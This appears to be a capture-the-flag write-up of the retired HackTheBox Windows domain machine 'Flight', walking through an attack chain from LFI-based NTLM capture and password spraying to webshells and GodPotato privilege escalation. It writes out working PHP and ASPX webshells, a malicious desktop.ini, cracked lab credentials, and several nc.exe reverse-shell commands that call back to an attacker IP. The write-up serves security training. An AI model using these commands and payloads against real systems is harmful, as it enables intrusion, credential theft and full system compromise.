# Flight — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Hard |
| Active Directory | Yes |
| IP | 10.129.228.120 |
| Domain | flight.htb |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/flight](https://jostif.pages.dev/writeups/flight) |

**Techniques:** vhost fuzzing → LFI UNC path → Responder NTLM capture → password spray → desktop.ini NTLM capture → PHP webshell → RunasCs lateral move → chisel tunnel → ASPX webshell on IIS → GodPotato SeImpersonate → SYSTEM

---

---

## Introduction

Flight is a Hard-rated Windows Active Directory machine on HackTheBox. Don't let the "Hard" label scare you — the difficulty comes from chaining several steps together, each one building on the last. By the end of this writeup you'll understand how a static-looking website can leak NTLM credentials, how password reuse across domain accounts can be catastrophic, and how a misconfigured IIS application pool can hand you SYSTEM.

The full attack chain looks like this:

```
LFI (UNC path) → NTLM capture → password spray → SMB write access
→ second NTLM capture → PHP webshell → RunasCs lateral move
→ ASPX webshell on IIS (port 8000) → GodPotato → SYSTEM
```

Let's walk through it step by step.

---

## Reconnaissance

### Nmap

The first thing I always do is a full port scan. I use `--min-rate 5000` to speed things up on HTB, and `-sC -sV` for default scripts and service version detection:

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.228.120
```

Key ports from the results:

| Port | Service | Notes |
|------|---------|-------|
| 53 | DNS | Domain controller indicator |
| 80 | HTTP | Apache 2.4.52, PHP 8.1.1, "g0 Aviation" site |
| 88 | Kerberos | Confirms this is a DC |
| 389/3268 | LDAP | Domain: **flight.htb** |
| 445 | SMB | Signing required |

One thing worth noting immediately — the clock skew is nearly 7 hours. This matters for Kerberos later. Any Kerberos ticket request needs to be within 5 minutes of the DC's clock. Keep this in mind.

### Adding DNS Entries

Before doing anything else, add the domain to `/etc/hosts`:

```bash
echo "10.129.228.120 flight.htb" | sudo tee -a /etc/hosts
```

### SMB Enumeration

I always try null auth and guest on SMB early:

```bash
nxc smb flight.htb -u '' -p ''
nxc smb flight.htb -u 'guest' -p ''
```

Null auth works (login succeeds) but shares are denied and RID brute fails. Guest is disabled. Not much here yet — we need credentials first.

### Web Enumeration

The site on port 80 is "g0 Aviation" — a static-looking HTML page. I ran feroxbuster to find hidden content:

```bash
feroxbuster -u http://10.129.228.120 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt -t 100
```

Nothing immediately interesting — just static assets. No PHP endpoints, no login forms. Time to check for virtual hosts.

### Virtual Host Discovery

A "virtual host" (vhost) is when one web server serves multiple websites based on the `Host` header. If `flight.htb` is the main site, there might be `admin.flight.htb`, `dev.flight.htb`, etc.

I use ffuf for this, fuzzing the Host header:

```bash
ffuf -u http://flight.htb/ -H "Host: FUZZ.flight.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -t 100 -mc 200,301,302,403 -fs 7069
```

> ⚠️ Common mistake: writing `http://FUZZ.flight.htb/` in the URL without the `-H` override. That won't work if the server doesn't do DNS-based routing from IP. Use the `-H "Host: FUZZ.flight.htb"` approach and filter by response size to eliminate the baseline.

Result:

```
school    [Status: 200, Size: 3996]
```

Add it to `/etc/hosts`:

```bash
echo "10.129.228.120 school.flight.htb" | sudo tee -a /etc/hosts
```

---

## Foothold — LFI to NTLM Hash Capture

### Discovering the LFI

Browsing `http://school.flight.htb` reveals a PHP site with a `?view=` parameter. Any time you see a parameter that looks like it loads a file, test for Local File Inclusion:

```
http://school.flight.htb/index.php?view=c:/windows/system32/drivers/etc/hosts
```

It works — the hosts file contents are returned. We have LFI.

### Turning LFI into NTLM Capture

Here's where it gets interesting. PHP's `include()` function doesn't just load local files — it also supports UNC paths (Windows network paths like `\\server\share`). When PHP tries to include a UNC path, Windows initiates an SMB connection to authenticate, which leaks an NTLMv2 hash.

We can capture this with Responder, a tool that mimics network services (SMB, HTTP, etc.) to capture authentication attempts.

**Step 1: Start Responder on your tun0 interface**

```bash
sudo responder -I tun0 -v
```

**Step 2: Trigger the UNC path via the LFI**

```bash
curl "http://school.flight.htb/index.php?view=//10.10.14.78/share"
```

Responder catches the incoming SMB auth:

```
[SMB] NTLMv2 Hash : svc_apache::flight:...
```

### Cracking the Hash

Save the hash to a file and crack it with hashcat. Mode `5600` is for NTLMv2:

```bash
hashcat -m 5600 ntlm_hash /usr/share/wordlists/rockyou.txt
```

Result: **`svc_apache:S@Ss!K@*t13`**

---

## Lateral Movement — Password Spray to c.bum

### Enumerating Users

With `svc_apache` credentials we can now enumerate domain users:

```bash
nxc smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --users
```

We get 15 accounts. Save them to `users.txt`.

### Password Spray

It's common for users to reuse passwords. Let's try `svc_apache`'s password across all users:

```bash
nxc smb flight.htb -u users.txt -p 'S@Ss!K@*t13' --continue-on-success
```

Hit: **`S.Moon:S@Ss!K@*t13`**

### Checking Shares as S.Moon

```bash
nxc smb flight.htb -u s.moon -p 'S@Ss!K@*t13' --shares
```

S.Moon has **READ,WRITE** on the `Shared` share. This is our next attack vector.

### Capturing c.bum's Hash via Malicious File

When users browse a network share through Windows Explorer, their system automatically authenticates to load thumbnails, icons, etc. We can abuse this by dropping a `desktop.ini` file with a UNC icon path pointing to our Responder.

Create the file:

```ini
[.ShellClassInfo]
IconResource=\\10.10.14.78\share\icon.ico
```

Upload it:

```bash
smbclient //flight.htb/Shared -U 's.moon%S@Ss!K@*t13' -c "put desktop.ini"
```

With Responder running, wait ~30-60 seconds. A user browses the share and triggers auth:

```
[SMB] NTLMv2 Hash : c.bum::flight.htb:...
```

Crack it:

```bash
hashcat -m 5600 hash2 /usr/share/wordlists/rockyou.txt
```

Result: **`c.bum:Tikkycoll_431012284`**

### c.bum's Access

```bash
nxc smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
```

c.bum has **READ,WRITE** on the `Web` share — which maps to `C:\xampp\htdocs`. This is the Apache webroot. We can write a PHP webshell.

---

## Shell as svc_apache — PHP Webshell

### Writing the Webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### Uploading via SMB

The `Web` share maps to `C:\xampp\htdocs`. The `school.flight.htb` vhost lives in a subdirectory there:

```bash
smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284' \
  -c "cd school.flight.htb; put shell.php; put nc.exe"
```

> ⚠️ smbclient doesn't understand local absolute paths in `put` commands. Copy files to your current directory first, then use `put filename`.

### Testing RCE

```bash
curl "http://school.flight.htb/shell.php?cmd=whoami"
# Returns: flight\svc_apache
```

### Getting a Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger
curl "http://school.flight.htb/shell.php?cmd=nc.exe+-e+cmd.exe+10.10.14.78+4444"
```

> 💡 Note: The box periodically cleans uploaded files. If your webshell returns 404, just re-upload via SMB.

We're now `flight\svc_apache` in an interactive shell.

---

## Lateral Movement — svc_apache to c.bum via RunasCs

### Internal Recon

From the svc_apache shell:

```cmd
netstat -ano | findstr LISTEN
```

Port **8000** is open internally — this is IIS. It's not exposed externally (firewall blocks it), but we can reach it once we tunnel.

```cmd
dir C:\inetpub\
icacls C:\inetpub\development\
```

Key finding: **`flight\C.Bum:(OI)(CI)(W)`** — c.bum has write access to `C:\inetpub\development\`, which is the IIS app root on port 8000.

We need to be c.bum to write there. We can use **RunasCs** — a tool that runs commands as another user without needing an interactive session.

### Upload RunasCs

```bash
smbclient //flight.htb/Web -U 'c.bum%Tikkycoll_431012284' \
  -c "cd school.flight.htb; put RunasCs.exe"
```

### Get a c.bum Shell

From the svc_apache shell:

```cmd
cd C:\xampp\htdocs\school.flight.htb
.\RunasCs.exe c.bum Tikkycoll_431012284 ".\nc.exe -e cmd.exe 10.10.14.78 4445" --logon-type 8
```

Listener on 4445:

```bash
nc -lvnp 4445
```

We now have a shell as **c.bum**. Grab the user flag:

```cmd
type C:\Users\C.Bum\Desktop\user.txt
```

---

## Privilege Escalation — IIS AppPool to SYSTEM via GodPotato

### Setting Up the Chisel Tunnel

Port 8000 is firewalled from external access. We tunnel through our c.bum shell using **chisel**, a fast TCP tunnel over HTTP/WebSocket.

**Kali (server):**

```bash
chisel server -p 9001 --reverse
```

**Target (client), from c.bum shell:**

```cmd
C:\xampp\htdocs\school.flight.htb\chisel.exe client 10.10.14.78:9001 R:8000:127.0.0.1:8000
```

Now `http://127.0.0.1:8000` on Kali maps to port 8000 on the target.

### Deploying the ASPX Webshell

PHP doesn't run on IIS — we need an **ASPX** webshell (C# / ASP.NET):

```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
var cmd = Request["cmd"];
var p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c " + cmd;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.Start();
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

Save as `shell.aspx`. From the c.bum shell, copy it and nc.exe to the development folder:

```cmd
copy C:\xampp\htdocs\school.flight.htb\shell.aspx C:\inetpub\development\shell.aspx
copy C:\xampp\htdocs\school.flight.htb\nc.exe C:\inetpub\development\nc.exe
copy C:\xampp\htdocs\school.flight.htb\GodPotato-NET4.exe C:\inetpub\development\GodPotato-NET4.exe
```

### Testing the IIS Shell

```bash
curl "http://127.0.0.1:8000/shell.aspx?cmd=whoami"
# Returns: iis apppool\defaultapppool
```

### Checking SeImpersonatePrivilege

```bash
curl "http://127.0.0.1:8000/shell.aspx?cmd=whoami+/priv"
```

```
SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
```

This is the key privilege for potato attacks. IIS worker processes almost always have it because they need to impersonate the authenticated web user.

### Get a Shell as IIS AppPool

```bash
nc -lvnp 4446
curl "http://127.0.0.1:8000/shell.aspx?cmd=C:\inetpub\development\nc.exe+-e+cmd.exe+10.10.14.78+4446"
```

### GodPotato — SeImpersonate to SYSTEM

**GodPotato** exploits `SeImpersonatePrivilege` by tricking a SYSTEM process into authenticating to a fake COM server we control, then stealing its token to run commands as SYSTEM.

From the IIS shell:

```cmd
cd C:\inetpub\development
.\GodPotato-NET4.exe -cmd ".\nc.exe -e cmd.exe 10.10.14.78 4447"
```

Listener on 4447:

```bash
nc -lvnp 4447
```

```cmd
whoami
# nt authority\system
```

### Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

| Step | Technique | Tool |
|------|-----------|------|
| VHost discovery | HTTP Host header fuzzing | ffuf |
| LFI to hash | UNC path in PHP include | curl + Responder |
| Hash cracking | Dictionary attack | hashcat |
| Password spray | Credential reuse | netexec |
| Second hash capture | Malicious desktop.ini | Responder |
| PHP webshell | SMB write to webroot | smbclient |
| Lateral move | RunasCs with known creds | RunasCs |
| Port forward | Reverse TCP tunnel | chisel |
| ASPX webshell | IIS code execution | smbclient |
| Privesc | SeImpersonatePrivilege abuse | GodPotato |

---

## Key Lessons

**1. LFI + UNC = NTLM capture**  
Any PHP `include()` or file load that accepts user input can be pointed at a UNC path. If the server is Windows and PHP runs as a domain user, you'll get an NTLMv2 hash.

**2. Password reuse is common**  
Always spray every cracked password across all known users. Service accounts especially tend to share passwords with regular user accounts.

**3. SMB write access = webshell**  
If you can write to an SMB share that maps to a web directory, you have code execution. Check `net share` to map share names to local paths.

**4. IIS + SeImpersonatePrivilege = easy SYSTEM**  
Application pool accounts almost always have `SeImpersonatePrivilege`. Combine that with any potato exploit (GodPotato works on modern Windows) and SYSTEM is a single command away.

**5. Internal ports need tunneling**  
Always run `netstat -ano | findstr LISTEN` when you have a shell. Firewalled internal services are often where the real juicy stuff lives. Chisel is reliable and easy to set up.
